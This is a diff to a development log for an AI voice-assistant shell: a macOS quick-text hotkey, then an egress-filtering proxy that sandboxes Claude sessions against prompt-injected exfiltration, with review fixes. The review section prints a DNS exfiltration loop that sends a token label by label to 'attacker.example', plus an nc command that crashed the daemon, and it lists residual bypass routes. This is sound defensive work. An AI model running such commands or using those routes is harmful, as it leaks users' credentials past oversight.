@@ -133,6 +133,56 @@ Two Opus reviewers (debugger + auditor) reviewed the M1 codebase. **All findings
 
 ## M2 — Swift shell + voice (complete)
 
+### Quick text input — ⌃Space floating box (2026-07-16)
+
+A single-line, Spotlight-style black pill to message Gumbo by typing (paste a long prompt without
+reading it aloud or opening the dashboard). **Shell-only — zero daemon/protocol/dashboard changes:**
+the box sends the existing `{type:'debug_text', text}`, which drives the orchestrator exactly like a
+voice turn (spoken reply). Pasting the M5 prompt → `spawn_claude_session`. Files:
+`Hotkey/Hotkeys.swift` (PTT monitor + the ⌃Space hotkey), new `QuickText/QuickTextController.swift`
+(panel + view + model), `App.swift` (wiring). Live-verified end-to-end by the user.
+
+- **Trigger = ⌃Space, via Carbon `RegisterEventHotKey`.** This was reached after two dead ends that
+  are the real lesson here. (1) ⌃Space via a global `.keyDown` NSEvent monitor — **silently dead: a
+  global `.keyDown` monitor receives nothing without the separate "Input Monitoring" grant**
+  (`kTCCServiceListenEvent`), distinct from Accessibility. PTT's `.flagsChanged` monitor works on
+  Accessibility alone because reading *modifiers* isn't keylogging; reading character keys is.
+  (2) Double-tap Control via `.flagsChanged` — detected fine, but the box **couldn't take keyboard
+  focus** (see next bullet), so we moved to `RegisterEventHotKey`, which needs a real key. It
+  captures ⌃Space with **no Input Monitoring**, and consumes the press so no stray Space leaks.
+  (You've disabled the macOS "previous input source" ⌃Space shortcut, so there's no system clash.)
+- **Focus was the hard part — and the fix was NOT activation.** On macOS 26 an LSUIElement/accessory
+  app **cannot become frontmost** from the background: cooperative activation refuses it. Verified
+  exhaustively via a temp file-diagnostic — `NSApp.activate(ignoringOtherApps:)`, modern
+  `NSApp.activate()`, `NSRunningApplication.activate`, and a `.regular` activation-policy toggle
+  ALL left `isActive=false, isKey=false, frontmost=com.apple.Terminal` (while `fr` was correctly the
+  text view). A window can only be *key* when its app is active, so none of it let you type. **The
+  answer is `.nonactivatingPanel` + a `canBecomeKey` override**: that style is purpose-built to let a
+  panel be the KEY window and receive keystrokes **without** activating its app (`isKey=true` with
+  `frontmost=Terminal` — they coexist). So we never call `activate` at all: `orderFrontRegardless()`
+  + `makeKey()`. Bonus: no activation ⇒ **no Dock-icon flash** (an earlier policy-toggle attempt
+  flashed one and *still* didn't focus). First responder is set in `SendingTextView.viewDidMoveToWindow`.
+- **Click-away closes via a global mouse-down monitor, NOT `resignKey`.** `resignKey` fired on
+  incidental focus perturbations (moving the cursor into the menubar, Spaces changes) and dismissed
+  the box out from under you. A global `[.leftMouseDown,.rightMouseDown]` monitor fires only on an
+  actual click in another app (clicks inside the panel are local events it never sees) — precise,
+  and hover no longer closes it. Removed on close.
+- **Send keys via a raw NSTextView, not SwiftUI `TextEditor`** — buys exact control: `keyDown`
+  intercepts Return (keyCode 36/76) with no Shift → send, Esc (53) → cancel, everything else
+  (incl. ⇧⏎ newline and ⌘V paste) → super. Paste never fires a Return keystroke, so multi-line
+  prompts paste in whole and only a real ⏎ submits.
+- **Look:** black `Capsule` (360×48) + `Tokens.line` border, `ember` caret, fade-in honoring Reduce
+  Motion. Placeholder "Message Gumbo…" is **drawn inside the NSTextView** (not a SwiftUI overlay) at
+  the caret's exact origin, with `lineFragmentPadding = 0` and a vertical `textContainerInset` that
+  centers the single line — so caret, text, and placeholder all share one centered origin (an
+  overlay drifted from the caret; centering by a fixed sub-frame left the line ~2px high).
+- **DEBUGGING META-LESSON:** when every variant of an approach fails *identically*, the approach is
+  wrong, not the parameters — we burned many cycles tuning activation before questioning whether to
+  activate at all. Also: launching the app from an automation shell (`open` from Claude Code's bash)
+  is a valid way to test the UI, but it does NOT change activation eligibility here (Finder launch
+  behaved the same) — and running the binary *directly* from a shell breaks its TCC attribution
+  (prints "waiting on Accessibility grant"), so always launch the `.app` via `open`/Finder.
+
 ### Build — daemon audio path + real shell (2026-07-14/15)
 
 **Daemon (additive — M1 text path still works, now with spoken replies):**
@@ -1121,6 +1171,107 @@ closed while keeping the session working *and* the network open in a single Seat
 the loopback filtering proxy (network default-deny) from `m41-spike/proxy-verify.mjs`. Flagged for
 the user; left as his capability-first call. The *fixable* credential surfaces (repo `.env`, gh/npm/
 cloud tokens, ssh/aws/gnupg) ARE now closed.
+
+### M4.1 — egress filtering proxy: network flipped OPEN → default-deny+allowlist+escalate (2026-07-16)
+
+the user's follow-up call after seeing the residual above: **close the GET-exfil channel** by routing
+ALL session egress through a loopback filtering proxy, without turning the sandbox back into a
+capability cage. So it's a *generous* allowlist + **escalate-on-unknown** (a notch confirm), not a
+hard 403 — the filesystem "safety net, not a cage" pattern applied to the network.
+
+- **`daemon/src/agents/egress-proxy.ts`** — a `127.0.0.1:0` CONNECT proxy. Allowlisted host → tunnel
+  (`net.connect` upstream, pipe both ways); UNKNOWN host → `onUnknown(host)` (the runner routes it to
+  `Supervisor.escalateHost` → the same notch confirm as git-push, deny-on-timeout). Decisions are
+  **memoized per session** (a host is prompted at most once; concurrent connects share one in-flight
+  promise). Robust socket error handlers everywhere — a client RST must never crash the daemon (the
+  spike learning: attach `clientSock.on('error')` FIRST). Plain HTTP (non-CONNECT) → 405.
+- **Why a proxy at all / why it can split CLI-vs-bash egress when Seatbelt can't:** a single Seatbelt
+  layer can only allow-or-deny network by IP, not by "who's asking" — it can't allow the CLI's
+  Anthropic egress while denying bash's. The proxy runs UNSANDBOXED in the daemon and is the one
+  choke point: the profile denies every direct socket and re-allows ONLY `localhost:<proxyPort>`, so
+  the CLI *and* any bash it spawns are forced through `HTTPS_PROXY`, where per-host filtering happens.
+- **Profile network rules** (`buildSandboxProfile(cwd, taskId, proxyPort)`, last-match-wins after
+  `allow default`): `(deny network*)` → `(allow network-outbound (remote ip "localhost:<port>"))` →
+  `(allow network-bind (local ip "localhost:*"))` → `(allow network-outbound (remote unix-socket))`.
+  **No DNS rule needed** — the confined process only ever connects to loopback; the *proxy* resolves
+  the real host upstream (verified: works with network otherwise fully denied). unix-socket egress is
+  allowed for local IPC.
+- **Allowlist = base + config-MCP + the user's extras.** `EGRESS_BASE_ALLOWLIST` (Anthropic/claude.ai,
+  the inherited `mcp.exa.ai`, and common dev/registry hosts: github, npm, pypi, crates) + the hosts of
+  `config.claude.mcpServers` **derived from their URLs** (so a changed MCP URL can't drift out of the
+  allowlist) + `config.claude.sandbox.allowedDomains`. MCP hosts are pre-allowlisted deliberately — a
+  headless confirm-timeout would otherwise break an MCP.
+- **Fail-closed** twice: sandbox-unavailable throws (unchanged), and a proxy that won't bind throws
+  `CLAUDE_PROXY_ERROR` before spawn — no session runs with unfiltered network. Proxy lifetime = the
+  session's; closed in `run()`'s `finally`.
+- **Verified live against the SHIPPED code** (`m41-spike/proxy-ship-verify.mjs`), not just the spike:
+  (a) CLI auths THROUGH the proxy (`init:true`); (b) `curl --noproxy` direct socket → sandbox-blocked;
+  (c) unlisted host (example.com), escalate→deny → proxy **403** (`CONNECT tunnel failed, response
+  403`); (d) allowlisted github → tunnels; (e) `~/Documents` write still **CONFINED** (file rules
+  untouched); (f) **context7 MCP connects through the proxy** — the one real unknown, RESOLVED: the
+  CLI's MCP HTTP transport honors `HTTPS_PROXY` (global dispatcher), so allowlisting the MCP host is
+  sufficient — no separate carve-out. Tests: 105/105 (+2 proxy tests; profile test gained network
+  assertions).
+- **The Keychain/transcript residual is now CLOSED for attacker-controlled hosts.** A prompt-injected
+  session can still *read* `~/.claude/**` or the OAuth token, but it can no longer ship them to an
+  attacker host — that host isn't allowlisted and the confirm denies on timeout headlessly. The
+  supervisor's network-SEND escalation stays as the semantic layer for *approved-host* sends (git push).
+- **Known follow-on:** inherited `~/.claude` MCPs the runner can't see (e.g. the claude.ai **Tavily**
+  connector) aren't pre-allowlisted, so their FIRST use escalates to a confirm (interactive: approve;
+  headless: denies → that MCP call fails, session continues). Add such hosts to `allowedDomains` if a
+  session needs them headlessly. **Undici caveat:** MCP-over-HTTP honoring `HTTPS_PROXY` relies on the
+  CLI setting a global dispatcher from env — re-verify `proxy-ship-verify.mjs` step (f) on SDK/CLI
+  upgrade.
+
+### M4.1 — egress-proxy /review-2 → /address pass (2026-07-16, 2 Fable agents)
+
+The just-shipped proxy went through a 2-agent review (Fable debugger + Fable auditor). It found
+**3 confirmed 🔴** (one was a real hole IN the proxy itself, empirically verified), plus 🟡s/🔵s —
+all addressed on `main` (`affa8d9`…`6eb519e`), 116/116 tests.
+
+- **🔴 DNS/mDNSResponder egress bypassed the proxy** — the big one. `(deny network*)` only blocks
+  the process's OWN sockets; `getaddrinfo`/`dns.lookup`/`dscacheutil`/`ping` resolve via
+  **`mDNSResponder`** over mach IPC, which `(allow default)` still permitted — so DNS queries left
+  the sandbox WITHOUT touching the proxy. **Verified**: under the shipped profile,
+  `socket.getaddrinfo('x.example')` returned a real address, so `for c in $(fold token); do
+  dscacheutil -q host -a name "$c.attacker.example"; done` would exfil the Keychain token label by
+  label. Fix: `(deny mach-lookup (global-name "com.apple.mDNSResponder"[.dnsproxy]))` — all name
+  resolution is now forced through the proxy. **Node/Python divergence that makes this free:** Python's
+  `create_connection` runs `getaddrinfo` even on a numeric IP, but Node skips the resolver when
+  `isIP(host)` is truthy; the CLI reaches the proxy at literal `127.0.0.1` and delegates hostname
+  resolution to the (unsandboxed) proxy via `CONNECT host:443`, so the confined side never needs
+  `getaddrinfo`. Re-verified: getaddrinfo/ping now fail while the CLI auths + resolves context7 MCP
+  through the proxy. Also dropped the blanket `(allow network-outbound (remote unix-socket))`
+  (docker.sock-style local-bridge exposure) and the moot `network-bind` rule.
+- **🔴 allowlisted CONNECT with an out-of-range port crashed the daemon** — `Number("99999")||443`
+  passed validation, and on the ALLOWLISTED path `net.connect(99999,…)` throws `ERR_SOCKET_BAD_PORT`
+  *synchronously*, escaping the handler (no `uncaughtException` handler → whole daemon dies). One
+  `printf 'CONNECT github.com:99999…' | nc 127.0.0.1 <proxyPort>` from a session killed Gumbo. Fix:
+  `parseTarget` validates port 1-65535 + non-empty host + strips IPv6 brackets → null → 403, and
+  `tunnel()`'s `connect()` is try-guarded.
+- **🔴 proxy bind failure crashed/hung** instead of the documented `CLAUDE_PROXY_ERROR` — the listen
+  promise only resolved and there was no server `'error'` handler. Fix: reject on `'error'`, swallow
+  post-listen errors.
+- **🟡s:** empty-host CONNECT reached the daemon's own loopback + IPv6 brackets never matched (both
+  fixed by `parseTarget`); case-sensitive memo re-prompted on case variants; inherited `NO_PROXY`
+  could unroute the CLI (now cleared); proxy leaked on a pre-loop throw (profile build guarded);
+  **overlapping egress confirms corrupted task status** — per-socket escalations can be pending
+  concurrently and outlive the turn, so the Supervisor now depth-counts blocks (status flips only on
+  0↔1) and `manager.setBlocked` won't un-park a task whose runner is gone; egress escalation errors
+  now leave an audit line (were silently denied) and a deny/timeout is no longer misattributed to an
+  active "the user denied".
+- **🔵s:** loopback/RFC1918 IP literals hard-refused (no confirm — SSRF/pivot); distinct-host
+  escalations capped (`MAX_ESCALATIONS`, bounds notch spam + the memo map); transient escalation
+  errors no longer cached (re-escalatable once the supervisor recovers).
+- **Documented residual (delegated egress the single OS layer still can't fully see):** DNS is now
+  closed, but macOS has other out-of-process networking delegates (`nsurlsessiond` XPC, Apple-Events
+  to a browser via `osascript`) that a `(deny network*)` profile can't enumerate exhaustively. The
+  exfil bar is now much higher (no DNS, no direct sockets, secrets unreadable, unknown hosts escalate),
+  but a determined injected session on an exotic delegate isn't provably zero. **Gate on SDK/CLI
+  upgrade:** re-run `m41-spike/proxy-ship-verify.mjs` (CLI+MCP through proxy) AND `dns-fix-probe.mjs`
+  (getaddrinfo blocked). New egress-proxy branches are unit-tested (approve→tunnel, forbidden literals,
+  case-insensitive memo, concurrent-share, thrown-escalation re-escalate, escalation cap, plain-HTTP
+  405, bind-failure fail-closed).
 
 ---
 
